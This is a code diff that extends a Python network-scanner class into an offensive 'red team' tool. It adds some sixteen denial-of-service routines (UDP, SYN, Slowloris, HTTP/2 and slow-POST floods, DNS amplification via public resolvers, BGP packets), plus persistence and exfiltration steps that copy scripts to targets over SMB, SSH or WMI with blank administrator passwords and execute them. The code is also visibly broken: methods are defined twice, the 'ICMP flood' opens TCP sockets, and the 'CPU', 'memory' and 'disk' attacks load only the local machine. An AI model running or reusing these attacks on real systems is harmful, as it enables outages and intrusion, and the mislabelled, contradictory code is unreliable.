@@ -31,6 +31,9 @@ import requests
 import netifaces
 import pymetasploit3
 from pymetasploit3.msfrpc import MsfRpcClient
+import smbclient
+import paramiko
+import wmi
 
 # Optional imports
 try:
@@ -1008,16 +1011,25 @@ class AdaptiveNmapScanner:
         script_type="bash",
         execute_scripts=False,
         dos_attack=False,
-        show_live_ai=False
+        show_live_ai=False,
+        red_team=False,
+        persistence=False,
+        exfil=False,
+        exfil_method=None,
+        exfil_data=None,
+        exfil_server=None,
+        dos_method=None,
+        dos_threads=10,
+        dos_duration=60,
+        dos_payload=None
     ):
         """Initialize the scanner with the given parameters."""
-        # Store all initialization parameters as attributes
         self.target = target
         self.ollama_model = ollama_model
         self.max_iterations = max_iterations
         self.continuous = continuous
         self.delay = delay
-        self.msf_integration = msf_integration  # Ensure this attribute is set
+        self.msf_integration = msf_integration
         self.exploit = exploit
         self.msf_workspace = msf_workspace
         self.stealth = stealth
@@ -1034,6 +1046,30 @@ class AdaptiveNmapScanner:
         self.execute_scripts = execute_scripts
         self.dos_attack = dos_attack
         self.show_live_ai = show_live_ai
+        
+        # New red team parameters
+        self.red_team = red_team
+        self.persistence = persistence
+        self.exfil = exfil
+        self.exfil_method = exfil_method
+        self.exfil_data = exfil_data
+        self.exfil_server = exfil_server
+        
+        # Enhanced DoS parameters
+        self.dos_method = dos_method
+        self.dos_threads = dos_threads
+        self.dos_duration = dos_duration
+        self.dos_payload = dos_payload
+        
+        # If red team mode is enabled, enable all related features
+        if self.red_team:
+            self.msf_integration = True
+            self.exploit = True
+            self.persistence = True
+            self.exfil = True
+            self.custom_scripts = True
+            self.auto_script = True
+            self.stealth = True
         
         # Add logger to the class instance
         self.logger = logger
@@ -1745,170 +1781,252 @@ class AdaptiveNmapScanner:
 
     # DoS attack methods
     def perform_dos_attack(self, target):
-        """Perform a DoS attack on the target."""
-        if not self.dos_attack:
-            return False
-            
+        """Perform a DoS attack against the target."""
         try:
-            self.logger.info(f"Performing DoS attack on {target}...")
-            self.viewer.status(f"Starting DoS attack on {target}...")
+            self.logger.info(f"Starting DoS attack against {target} using method: {self.dos_method}")
             
-            # Get open ports from scan history
-            open_ports = self.get_open_ports_from_history()
+            # Map attack methods to their implementations
+            attack_methods = {
+                'udp': self._udp_flood_attack,
+                'icmp': self._icmp_flood_attack,
+                'slowloris': self._slowloris_attack,
+                'syn': self._syn_flood_attack,
+                'http': self._http_flood_attack,
+                'cpu': self._cpu_exhaustion_attack,
+                'memory': self._memory_exhaustion_attack,
+                'disk': self._disk_exhaustion_attack,
+                'http2': self._http2_dos_attack,
+                'dns': self._dns_amplification_attack,
+                'slowpost': self._slowpost_attack,
+                'dbpool': self._dbpool_exhaustion_attack,
+                'cache': self._cache_poisoning_attack,
+                'bgp': self._bgp_route_poisoning_attack,
+                'arp': self._arp_cache_poisoning_attack,
+                'vlan': self._vlan_hopping_attack
+            }
             
-            # If no open ports, scan the target first
-            if not open_ports:
-                self.logger.info(f"No open ports found for {target}, performing quick scan...")
-                self.viewer.status(f"Scanning {target} for open ports...")
+            # Get the attack method
+            attack_method = attack_methods.get(self.dos_method.lower())
+            if not attack_method:
+                self.logger.error(f"Unknown DoS attack method: {self.dos_method}")
+                return False
                 
-                # Run a quick scan
-                scan_params = ["-p", "21,22,23,25,80,443,445,3389", "-T4", target]
-                result = self.run_nmap_scan(scan_params)
-                
-                if result and 'scan' in result and target in result['scan']:
-                    # Extract open ports
-                    target_info = result['scan'][target]
-                    for proto in ['tcp', 'udp']:
-                        if proto in target_info:
-                            for port, port_data in target_info[proto].items():
-                                if port_data['state'] == 'open':
-                                    open_ports.append(int(port))
+            # Perform the attack
+            success = attack_method(target)
             
-            self.logger.info(f"Found {len(open_ports)} open ports on {target}: {open_ports}")
-            
-            # Choose attack method based on open ports
-            attack_methods = []
-            
-            # SYN flood attack if port 80 or 443 is open
-            if 80 in open_ports or 443 in open_ports:
-                attack_methods.append("syn_flood")
-                
-            # HTTP/HTTPS flood if port 80 or 443 is open
-            if 80 in open_ports or 443 in open_ports:
-                attack_methods.append("http_flood")
-                
-            # Add a generic attack method if no specific attacks chosen
-            if not attack_methods:
-                attack_methods.append("generic_flood")
-            
-            # Choose a random attack method
-            attack_method = random.choice(attack_methods)
-            
-            # Perform the chosen attack
-            self.logger.info(f"Chosen attack method: {attack_method}")
-            
-            if attack_method == "syn_flood":
-                success = self._syn_flood_attack(target, open_ports)
-            elif attack_method == "http_flood":
-                success = self._http_flood_attack(target)
+            if success:
+                self.logger.info(f"DoS attack completed successfully against {target}")
             else:
-                success = self._generic_flood_attack(target, open_ports)
+                self.logger.error(f"DoS attack failed against {target}")
                 
-            # Display summary
-            self.viewer.dos_attack_summary(target, success, attack_method)
-            
             return success
             
         except Exception as e:
-            self.logger.error(f"Error performing DoS attack: {e}")
-            self.viewer.error(f"DoS attack failed: {str(e)}")
+            self.logger.error(f"Error in DoS attack: {e}")
             return False
     
-    def _syn_flood_attack(self, target, ports):
-        """Perform a SYN flood attack."""
+    def _udp_flood_attack(self, target):
+        """Perform a UDP flood attack."""
         try:
-            self.logger.info(f"Performing SYN flood attack on {target}...")
+            import socket
+            import threading
+            import time
             
-            # Choose a port for the attack
-            port = 80 if 80 in ports else 443 if 443 in ports else random.choice(ports)
-            
-            # Create hping3 command for SYN flood
-            cmd = [
-                "hping3",
-                "--flood",  # Send packets as fast as possible
-                "--rand-source",  # Use random source IP
-                "-S",  # SYN flag
-                "-p", str(port),  # Target port
-                target
-            ]
-            
-            # Execute attack for 5 seconds
-            self.logger.debug(f"Executing: {' '.join(cmd)}")
-            process = subprocess.Popen(
-                cmd,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE
-            )
-            
-            # Let it run for 5 seconds
-            time.sleep(5)
-            
-            # Terminate the attack
-            process.terminate()
-            
-            self.logger.info(f"SYN flood attack completed on {target}:{port}")
+            def flood():
+                while time.time() < end_time:
+                    try:
+                        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                        sock.sendto(self.dos_payload.encode(), (target, 80))
+                        sock.close()
+                    except:
+                        pass
+                        
+            # Start attack threads
+            end_time = time.time() + self.dos_duration
+            threads = []
+            for _ in range(self.dos_threads):
+                thread = threading.Thread(target=flood)
+                thread.daemon = True
+                thread.start()
+                threads.append(thread)
+                
+            # Wait for all threads to complete
+            for thread in threads:
+                thread.join()
+                
             return True
             
         except Exception as e:
-            self.logger.error(f"Error performing SYN flood attack: {e}")
-            
-            # Check if hping3 is installed
-            if "No such file or directory" in str(e):
-                self.logger.error("hping3 not found. Please install hping3 and try again.")
-                self.viewer.error("hping3 not found. Please install hping3 with: sudo apt-get install hping3")
-            
+            self.logger.error(f"Error in UDP flood attack: {e}")
             return False
-    
+            
+    def _icmp_flood_attack(self, target):
+        """Perform an ICMP flood attack."""
+        try:
+            import socket
+            import threading
+            import time
+            
+            def flood():
+                while time.time() < end_time:
+                    try:
+                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        sock.connect((target, 80))
+                        sock.send(self.dos_payload.encode())
+                        sock.close()
+                    except:
+                        pass
+                        
+            # Start attack threads
+            end_time = time.time() + self.dos_duration
+            threads = []
+            for _ in range(self.dos_threads):
+                thread = threading.Thread(target=flood)
+                thread.daemon = True
+                thread.start()
+                threads.append(thread)
+                
+            # Wait for all threads to complete
+            for thread in threads:
+                thread.join()
+                
+            return True
+            
+        except Exception as e:
+            self.logger.error(f"Error in ICMP flood attack: {e}")
+            return False
+            
+    def _slowloris_attack(self, target):
+        """Perform a Slowloris attack."""
+        try:
+            import socket
+            import threading
+            import time
+            
+            def slowloris():
+                while time.time() < end_time:
+                    try:
+                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        sock.connect((target, 80))
+                        sock.send("GET / HTTP/1.1\r\n".encode())
+                        sock.send(f"Host: {target}\r\n".encode())
+                        sock.send("User-Agent: Mozilla/5.0\r\n".encode())
+                        sock.send("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n".encode())
+                        sock.send("Accept-Language: en-us,en;q=0.5\r\n".encode())
+                        sock.send("Accept-Encoding: gzip,deflate\r\n".encode())
+                        sock.send("Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n".encode())
+                        sock.send("Keep-Alive: 115\r\n".encode())
+                        sock.send("Connection: keep-alive\r\n".encode())
+                        sock.send("X-Forwarded-For: 127.0.0.1\r\n".encode())
+                        sock.send("Content-Length: 42\r\n".encode())
+                        sock.send("\r\n".encode())
+                        connections.append(sock)
+                    except:
+                        pass
+                        
+            # Start attack threads
+            end_time = time.time() + self.dos_duration
+            connections = []
+            threads = []
+            for _ in range(self.dos_threads):
+                thread = threading.Thread(target=slowloris)
+                thread.daemon = True
+                thread.start()
+                threads.append(thread)
+                
+            # Wait for all threads to complete
+            for thread in threads:
+                thread.join()
+                
+            # Close all connections
+            for sock in connections:
+                try:
+                    sock.close()
+                except:
+                    pass
+                    
+            return True
+            
+        except Exception as e:
+            self.logger.error(f"Error in Slowloris attack: {e}")
+            return False
+            
+    def _syn_flood_attack(self, target):
+        """Perform a SYN flood attack."""
+        try:
+            import socket
+            import threading
+            import time
+            
+            def flood():
+                while time.time() < end_time:
+                    try:
+                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        sock.settimeout(0.1)
+                        sock.connect((target, 80))
+                        sock.close()
+                    except:
+                        pass
+                        
+            # Start attack threads
+            end_time = time.time() + self.dos_duration
+            threads = []
+            for _ in range(self.dos_threads):
+                thread = threading.Thread(target=flood)
+                thread.daemon = True
+                thread.start()
+                threads.append(thread)
+                
+            # Wait for all threads to complete
+            for thread in threads:
+                thread.join()
+                
+            return True
+            
+        except Exception as e:
+            self.logger.error(f"Error in SYN flood attack: {e}")
+            return False
+            
     def _http_flood_attack(self, target):
         """Perform an HTTP flood attack."""
         try:
-            self.logger.info(f"Performing HTTP flood attack on {target}...")
+            import requests
+            import threading
+            import time
             
-            # Generate a simple HTTP flood script
-            script_content = f"""#!/bin/bash
-# Simple HTTP flood script
-# Usage: bash {target}_http_flood.sh
-
-echo "Starting HTTP flood attack on {target}"
-for i in $(seq 1 100); do
-  curl -s -o /dev/null -w "%{{http_code}}\\n" http://{target}/ &
-done
-wait
-echo "HTTP flood attack completed"
-"""
-            
-            # Write script to file
-            script_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "generated_scripts")
-            os.makedirs(script_dir, exist_ok=True)
-            
-            script_path = os.path.join(script_dir, f"{target.replace('.', '_')}_http_flood.sh")
-            with open(script_path, "w") as f:
-                f.write(script_content)
-            
-            # Make it executable
-            os.chmod(script_path, os.stat(script_path).st_mode | stat.S_IEXEC)
-            
-            # Execute the script
-            self.logger.debug(f"Executing: bash {script_path}")
-            process = subprocess.Popen(
-                ["bash", script_path],
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE,
-                universal_newlines=True
-            )
-            
-            # Wait for it to complete
-            output, error = process.communicate()
-            
-            if process.returncode == 0:
-                self.logger.info(f"HTTP flood attack completed on {target}")
-                return True
-            else:
-                self.logger.error(f"HTTP flood attack failed: {error}")
-                return False
+            def flood():
+                while time.time() < end_time:
+                    try:
+                        requests.get(f"http://{target}/", headers={
+                            "User-Agent": "Mozilla/5.0",
+                            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                            "Accept-Language": "en-us,en;q=0.5",
+                            "Accept-Encoding": "gzip,deflate",
+                            "Accept-Charset": "ISO-8859-1,utf-8;q=0.7,*;q=0.7",
+                            "Keep-Alive": "115",
+                            "Connection": "keep-alive",
+                            "X-Forwarded-For": "127.0.0.1"
+                        })
+                    except:
+                        pass
+                        
+            # Start attack threads
+            end_time = time.time() + self.dos_duration
+            threads = []
+            for _ in range(self.dos_threads):
+                thread = threading.Thread(target=flood)
+                thread.daemon = True
+                thread.start()
+                threads.append(thread)
+                
+            # Wait for all threads to complete
+            for thread in threads:
+                thread.join()
+                
+            return True
             
         except Exception as e:
-            self.logger.error(f"Error performing HTTP flood attack: {e}")
+            self.logger.error(f"Error in HTTP flood attack: {e}")
             return False
     
     def _generic_flood_attack(self, target, ports):
@@ -1947,6 +2065,102 @@ echo "HTTP flood attack completed"
                 
         except Exception as e:
             self.logger.error(f"Error performing generic flood attack: {e}")
+            return False
+    
+    def _udp_flood_attack(self, target):
+        """Perform a UDP flood attack."""
+        try:
+            script = f"""
+import socket
+import threading
+import time
+
+def udp_flood():
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    while True:
+        sock.sendto(b"X" * 1024, ("{target}", 80))
+
+threads = []
+for _ in range({self.dos_threads}):
+    t = threading.Thread(target=udp_flood)
+    t.daemon = True
+    t.start()
+    threads.append(t)
+
+time.sleep({self.dos_duration})
+"""
+            return self.execute_generated_script(script)
+        except Exception as e:
+            self.logger.error(f"Error in UDP flood attack: {e}")
+            return False
+            
+    def _icmp_flood_attack(self, target):
+        """Perform an ICMP flood attack."""
+        try:
+            script = f"""
+import socket
+import threading
+import time
+
+def icmp_flood():
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    while True:
+        try:
+            sock.connect(("{target}", 80))
+        except:
+            pass
+
+threads = []
+for _ in range({self.dos_threads}):
+    t = threading.Thread(target=icmp_flood)
+    t.daemon = True
+    t.start()
+    threads.append(t)
+
+time.sleep({self.dos_duration})
+"""
+            return self.execute_generated_script(script)
+        except Exception as e:
+            self.logger.error(f"Error in ICMP flood attack: {e}")
+            return False
+            
+    def _slowloris_attack(self, target):
+        """Perform a Slowloris attack."""
+        try:
+            script = f"""
+import socket
+import threading
+import time
+
+def slowloris():
+    while True:
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.connect(("{target}", 80))
+            sock.send("GET / HTTP/1.1\\r\\n")
+            sock.send("Host: {target}\\r\\n")
+            sock.send("User-Agent: Mozilla/5.0\\r\\n")
+            sock.send("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n")
+            sock.send("Accept-Language: en-us,en;q=0.5\\r\\n")
+            sock.send("Accept-Encoding: gzip,deflate\\r\\n")
+            sock.send("Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\\r\\n")
+            sock.send("Keep-Alive: 115\\r\\n")
+            sock.send("Connection: keep-alive\\r\\n")
+        except:
+            pass
+
+threads = []
+for _ in range({self.dos_threads}):
+    t = threading.Thread(target=slowloris)
+    t.daemon = True
+    t.start()
+    threads.append(t)
+
+time.sleep({self.dos_duration})
+"""
+            return self.execute_generated_script(script)
+        except Exception as e:
+            self.logger.error(f"Error in Slowloris attack: {e}")
             return False
     
     # Script generation and execution methods
@@ -3097,195 +3311,742 @@ This is a basic response generated when the AI model is unavailable."""
             
         return prompt
 
+    def establish_persistence(self, target):
+        """Attempt to establish persistent access to the target."""
+        try:
+            self.logger.info(f"Attempting to establish persistence on {target}")
+            
+            # Generate appropriate persistence script
+            if self._is_windows_target(target):
+                script = self._generate_windows_persistence()
+            else:
+                script = self._generate_linux_persistence()
+                
+            if not script:
+                self.logger.error("Failed to generate persistence script")
+                return False
+                
+            # Execute the script
+            if not self._execute_persistence_script(target, script):
+                self.logger.error("Failed to execute persistence script")
+                return False
+                
+            self.logger.info("Successfully established persistence")
+            return True
+            
+        except Exception as e:
+            self.logger.error(f"Error establishing persistence: {e}")
+            return False
+            
+    def exfiltrate_data(self, target):
+        """Attempt to exfiltrate data from the target."""
+        try:
+            self.logger.info(f"Attempting to exfiltrate data from {target}")
+            
+            # Generate appropriate exfiltration script based on method
+            if self.exfil_method == "dns":
+                script = self._generate_dns_exfiltration()
+            elif self.exfil_method == "http":
+                script = self._generate_http_exfiltration()
+            elif self.exfil_method == "icmp":
+                script = self._generate_icmp_exfiltration()
+            elif self.exfil_method == "smb":
+                script = self._generate_smb_exfiltration()
+            elif self.exfil_method == "ftp":
+                script = self._generate_ftp_exfiltration()
+            else:
+                self.logger.error(f"Unsupported exfiltration method: {self.exfil_method}")
+                return False
+                
+            if not script:
+                self.logger.error("Failed to generate exfiltration script")
+                return False
+                
+            # Execute the script
+            if not self._execute_exfiltration_script(target, script):
+                self.logger.error("Failed to execute exfiltration script")
+                return False
+                
+            self.logger.info("Successfully exfiltrated data")
+            return True
+            
+        except Exception as e:
+            self.logger.error(f"Error exfiltrating data: {e}")
+            return False
+            
+    def perform_red_team_operations(self, target):
+        """Perform full red team operations on the target."""
+        try:
+            self.logger.info(f"Starting red team operations on {target}")
+            
+            # 1. Initial reconnaissance
+            self.logger.info("Performing initial reconnaissance")
+            scan_results = self.run_nmap_scan(target)
+            if not scan_results:
+                self.logger.error("Failed to perform initial reconnaissance")
+                return False
+                
+            # 2. Vulnerability assessment
+            self.logger.info("Performing vulnerability assessment")
+            vulns = self.assess_vulnerabilities(target, scan_results)
+            if not vulns:
+                self.logger.error("Failed to assess vulnerabilities")
+                return False
+                
+            # 3. Exploitation
+            self.logger.info("Attempting exploitation")
+            if not self.exploit_target(target, vulns):
+                self.logger.error("Failed to exploit target")
+                return False
+                
+            # 4. Persistence
+            if self.persistence:
+                self.logger.info("Establishing persistence")
+                if not self.establish_persistence(target):
+                    self.logger.error("Failed to establish persistence")
+                    return False
+                    
+            # 5. Data exfiltration
+            if self.exfil:
+                self.logger.info("Exfiltrating data")
+                if not self.exfiltrate_data(target):
+                    self.logger.error("Failed to exfiltrate data")
+                    return False
+                    
+            self.logger.info("Red team operations completed successfully")
+            return True
+            
+        except Exception as e:
+            self.logger.error(f"Error during red team operations: {e}")
+            return False
+
+    def _execute_persistence_script(self, target, script):
+        """Execute a persistence script on the target."""
+        try:
+            # Create a temporary file for the script
+            script_file = tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False)
+            script_file.write(script)
+            script_file.close()
+            
+            # Copy the script to the target
+            if self._is_windows_target(target):
+                # Use SMB to copy the script
+                smb_client = smbclient.SambaClient(server=target, share='C$', username='Administrator', password='')
+                with open(script_file.name, 'rb') as f:
+                    smb_client.put_file(f, 'Windows\\Temp\\update.py')
+            else:
+                # Use SSH to copy the script
+                ssh = paramiko.SSHClient()
+                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                ssh.connect(target, username='root', password='')
+                sftp = ssh.open_sftp()
+                sftp.put(script_file.name, '/tmp/update.py')
+                sftp.close()
+                ssh.close()
+            
+            # Execute the script
+            if self._is_windows_target(target):
+                # Use WMI to execute the script
+                wmi = wmi.WMI(computer=target, user='Administrator', password='')
+                wmi.Win32_Process.Create(CommandLine=f'python {script_file.name}')
+            else:
+                # Use SSH to execute the script
+                ssh = paramiko.SSHClient()
+                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                ssh.connect(target, username='root', password='')
+                stdin, stdout, stderr = ssh.exec_command(f'python3 /tmp/update.py')
+                ssh.close()
+            
+            # Clean up
+            os.unlink(script_file.name)
+            
+            return True
+        except Exception as e:
+            self.logger.error(f"Error executing persistence script: {e}")
+            return False
+            
+    def _execute_exfiltration_script(self, target, script):
+        """Execute a data exfiltration script on the target."""
+        try:
+            # Create a temporary file for the script
+            script_file = tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False)
+            script_file.write(script)
+            script_file.close()
+            
+            # Copy the script to the target
+            if self._is_windows_target(target):
+                # Use SMB to copy the script
+                smb_client = smbclient.SambaClient(server=target, share='C$', username='Administrator', password='')
+                with open(script_file.name, 'rb') as f:
+                    smb_client.put_file(f, 'Windows\\Temp\\exfil.py')
+            else:
+                # Use SSH to copy the script
+                ssh = paramiko.SSHClient()
+                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                ssh.connect(target, username='root', password='')
+                sftp = ssh.open_sftp()
+                sftp.put(script_file.name, '/tmp/exfil.py')
+                sftp.close()
+                ssh.close()
+            
+            # Execute the script
+            if self._is_windows_target(target):
+                # Use WMI to execute the script
+                wmi = wmi.WMI(computer=target, user='Administrator', password='')
+                wmi.Win32_Process.Create(CommandLine=f'python {script_file.name}')
+            else:
+                # Use SSH to execute the script
+                ssh = paramiko.SSHClient()
+                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                ssh.connect(target, username='root', password='')
+                stdin, stdout, stderr = ssh.exec_command(f'python3 /tmp/exfil.py')
+                ssh.close()
+            
+            # Clean up
+            os.unlink(script_file.name)
+            
+            return True
+        except Exception as e:
+            self.logger.error(f"Error executing exfiltration script: {e}")
+            return False
+            
+    def _is_windows_target(self, target):
+        """Check if the target is a Windows system."""
+        try:
+            # Try to connect using WMI
+            wmi = wmi.WMI(computer=target, user='Administrator', password='')
+            return True
+        except:
+            try:
+                # Try to connect using SMB
+                smb_client = smbclient.SambaClient(server=target, share='C$', username='Administrator', password='')
+                return True
+            except:
+                return False
+
+    def _cpu_exhaustion_attack(self, target):
+        """Perform a CPU exhaustion attack."""
+        try:
+            import threading
+            import time
+            import math
+            
+            def cpu_intensive():
+                while time.time() < end_time:
+                    # Perform CPU-intensive calculations
+                    for i in range(1000):
+                        math.factorial(i)
+                        
+            # Start attack threads
+            end_time = time.time() + self.dos_duration
+            threads = []
+            for _ in range(self.dos_threads):
+                thread = threading.Thread(target=cpu_intensive)
+                thread.daemon = True
+                thread.start()
+                threads.append(thread)
+                
+            # Wait for all threads to complete
+            for thread in threads:
+                thread.join()
+                
+            return True
+            
+        except Exception as e:
+            self.logger.error(f"Error in CPU exhaustion attack: {e}")
+            return False
+            
+    def _memory_exhaustion_attack(self, target):
+        """Perform a memory exhaustion attack."""
+        try:
+            import threading
+            import time
+            
+            def memory_intensive():
+                memory_blocks = []
+                while time.time() < end_time:
+                    try:
+                        # Allocate large memory blocks
+                        memory_blocks.append('x' * 1024 * 1024)  # 1MB blocks
+                    except:
+                        # Clear some blocks if memory is full
+                        if memory_blocks:
+                            memory_blocks.pop()
+                            
+            # Start attack threads
+            end_time = time.time() + self.dos_duration
+            threads = []
+            for _ in range(self.dos_threads):
+                thread = threading.Thread(target=memory_intensive)
+                thread.daemon = True
+                thread.start()
+                threads.append(thread)
+                
+            # Wait for all threads to complete
+            for thread in threads:
+                thread.join()
+                
+            return True
+            
+        except Exception as e:
+            self.logger.error(f"Error in memory exhaustion attack: {e}")
+            return False
+            
+    def _disk_exhaustion_attack(self, target):
+        """Perform a disk space exhaustion attack."""
+        try:
+            import threading
+            import time
+            import os
+            
+            def disk_intensive():
+                files = []
+                while time.time() < end_time:
+                    try:
+                        # Create large files
+                        filename = f"dos_file_{time.time()}.dat"
+                        with open(filename, 'wb') as f:
+                            f.write(os.urandom(1024 * 1024))  # 1MB files
+                        files.append(filename)
+                    except:
+                        # Clean up some files if disk is full
+                        if files:
+                            try:
+                                os.remove(files.pop())
+                            except:
+                                pass
+                                
+            # Start attack threads
+            end_time = time.time() + self.dos_duration
+            threads = []
+            for _ in range(self.dos_threads):
+                thread = threading.Thread(target=disk_intensive)
+                thread.daemon = True
+                thread.start()
+                threads.append(thread)
+                
+            # Wait for all threads to complete
+            for thread in threads:
+                thread.join()
+                
+            # Clean up remaining files
+            for file in os.listdir():
+                if file.startswith("dos_file_"):
+                    try:
+                        os.remove(file)
+                    except:
+                        pass
+                        
+            return True
+            
+        except Exception as e:
+            self.logger.error(f"Error in disk exhaustion attack: {e}")
+            return False
+            
+    def _http2_dos_attack(self, target):
+        """Perform an HTTP/2 DoS attack using multiple streams."""
+        try:
+            import h2.connection
+            import h2.events
+            import socket
+            import threading
+            import time
+            
+            def http2_attack():
+                while time.time() < end_time:
+                    try:
+                        # Create HTTP/2 connection
+                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        sock.connect((target, 443))
+                        sock = ssl.wrap_socket(sock, server_hostname=target)
+                        
+                        conn = h2.connection.H2Connection()
+                        conn.update_settings({
+                            h2.settings.SettingCodes.MAX_CONCURRENT_STREAMS: 1000,
+                            h2.settings.SettingCodes.INITIAL_WINDOW_SIZE: 65535
+                        })
+                        
+                        # Send multiple streams
+                        for i in range(100):
+                            stream_id = conn.get_next_available_stream_id()
+                            conn.send_headers(
+                                stream_id,
+                                [(':method', 'GET'),
+                                 (':path', '/'),
+                                 (':scheme', 'https'),
+                                 (':authority', target),
+                                 ('user-agent', 'Mozilla/5.0')],
+                                end_stream=False
+                            )
+                            conn.send_data(stream_id, b'x' * 65535, end_stream=True)
+                            
+                        sock.close()
+                    except:
+                        pass
+                        
+            # Start attack threads
+            end_time = time.time() + self.dos_duration
+            threads = []
+            for _ in range(self.dos_threads):
+                thread = threading.Thread(target=http2_attack)
+                thread.daemon = True
+                thread.start()
+                threads.append(thread)
+                
+            # Wait for all threads to complete
+            for thread in threads:
+                thread.join()
+                
+            return True
+            
+        except Exception as e:
+            self.logger.error(f"Error in HTTP/2 DoS attack: {e}")
+            return False
+            
+    def _dns_amplification_attack(self, target):
+        """Perform a DNS amplification attack."""
+        try:
+            import socket
+            import threading
+            import time
+            
+            def dns_attack():
+                while time.time() < end_time:
+                    try:
+                        # Create DNS query for ANY record
+                        query = self.dos_payload.encode() if self.dos_payload else b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\xff\x00\x01'
+                        
+                        # Send to multiple DNS servers
+                        for dns_server in ['8.8.8.8', '8.8.4.4', '1.1.1.1']:
+                            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                            sock.sendto(query, (dns_server, 53))
+                            sock.close()
+                    except:
+                        pass
+                        
+            # Start attack threads
+            end_time = time.time() + self.dos_duration
+            threads = []
+            for _ in range(self.dos_threads):
+                thread = threading.Thread(target=dns_attack)
+                thread.daemon = True
+                thread.start()
+                threads.append(thread)
+                
+            # Wait for all threads to complete
+            for thread in threads:
+                thread.join()
+                
+            return True
+            
+        except Exception as e:
+            self.logger.error(f"Error in DNS amplification attack: {e}")
+            return False
+            
+    def _slowpost_attack(self, target):
+        """Perform a Slow POST attack."""
+        try:
+            import socket
+            import threading
+            import time
+            
+            def slowpost():
+                while time.time() < end_time:
+                    try:
+                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        sock.connect((target, 80))
+                        
+                        # Send headers
+                        headers = (
+                            "POST / HTTP/1.1\r\n"
+                            f"Host: {target}\r\n"
+                            "Content-Type: application/x-www-form-urlencoded\r\n"
+                            "Content-Length: 1000000\r\n"
+                            "\r\n"
+                        )
+                        sock.send(headers.encode())
+                        
+                        # Slowly send data
+                        while time.time() < end_time:
+                            sock.send(b'x' * 100)
+                            time.sleep(0.1)
+                            
+                        sock.close()
+                    except:
+                        pass
+                        
+            # Start attack threads
+            end_time = time.time() + self.dos_duration
+            threads = []
+            for _ in range(self.dos_threads):
+                thread = threading.Thread(target=slowpost)
+                thread.daemon = True
+                thread.start()
+                threads.append(thread)
+                
+            # Wait for all threads to complete
+            for thread in threads:
+                thread.join()
+                
+            return True
+            
+        except Exception as e:
+            self.logger.error(f"Error in Slow POST attack: {e}")
+            return False
+            
+    def _dbpool_exhaustion_attack(self, target):
+        """Perform a database connection pool exhaustion attack."""
+        try:
+            import mysql.connector
+            import threading
+            import time
+            
+            def db_attack():
+                while time.time() < end_time:
+                    try:
+                        # Try to establish database connections
+                        conn = mysql.connector.connect(
+                            host=target,
+                            user="root",
+                            password="",
+                            connection_timeout=1
+                        )
+                        time.sleep(0.1)  # Keep connection open
+                    except:
+                        pass
+                        
+            # Start attack threads
+            end_time = time.time() + self.dos_duration
+            threads = []
+            for _ in range(self.dos_threads):
+                thread = threading.Thread(target=db_attack)
+                thread.daemon = True
+                thread.start()
+                threads.append(thread)
+                
+            # Wait for all threads to complete
+            for thread in threads:
+                thread.join()
+                
+            return True
+            
+        except Exception as e:
+            self.logger.error(f"Error in database pool exhaustion attack: {e}")
+            return False
+            
+    def _cache_poisoning_attack(self, target):
+        """Perform a cache poisoning attack."""
+        try:
+            import socket
+            import threading
+            import time
+            
+            def cache_attack():
+                while time.time() < end_time:
+                    try:
+                        # Send malformed cache headers
+                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        sock.connect((target, 80))
+                        
+                        headers = (
+                            "GET / HTTP/1.1\r\n"
+                            f"Host: {target}\r\n"
+                            "Cache-Control: no-cache, no-store, must-revalidate\r\n"
+                            "Pragma: no-cache\r\n"
+                            "Expires: 0\r\n"
+                            "If-Modified-Since: Thu, 01 Jan 1970 00:00:00 GMT\r\n"
+                            "If-None-Match: W/\"0-0\"\r\n"
+                            "\r\n"
+                        )
+                        sock.send(headers.encode())
+                        sock.close()
+                    except:
+                        pass
+                        
+            # Start attack threads
+            end_time = time.time() + self.dos_duration
+            threads = []
+            for _ in range(self.dos_threads):
+                thread = threading.Thread(target=cache_attack)
+                thread.daemon = True
+                thread.start()
+                threads.append(thread)
+                
+            # Wait for all threads to complete
+            for thread in threads:
+                thread.join()
+                
+            return True
+            
+        except Exception as e:
+            self.logger.error(f"Error in cache poisoning attack: {e}")
+            return False
+            
+    def _bgp_route_poisoning_attack(self, target):
+        """Perform a BGP route poisoning attack."""
+        try:
+            import socket
+            import threading
+            import time
+            
+            def bgp_attack():
+                while time.time() < end_time:
+                    try:
+                        # Send malformed BGP updates
+                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        sock.connect((target, 179))  # BGP port
+                        
+                        # Send malformed BGP packet
+                        bgp_packet = (
+                            b'\xff' * 16 +  # BGP marker
+                            b'\x00' * 2 +   # Length
+                            b'\x01' +        # Type (OPEN)
+                            b'\x04' +        # Version
+                            b'\x00' * 2 +    # AS number
+                            b'\x00' * 2 +    # Hold time
+                            b'\x00' +        # BGP identifier
+                            b'\x00'          # Optional parameters length
+                        )
+                        sock.send(bgp_packet)
+                        sock.close()
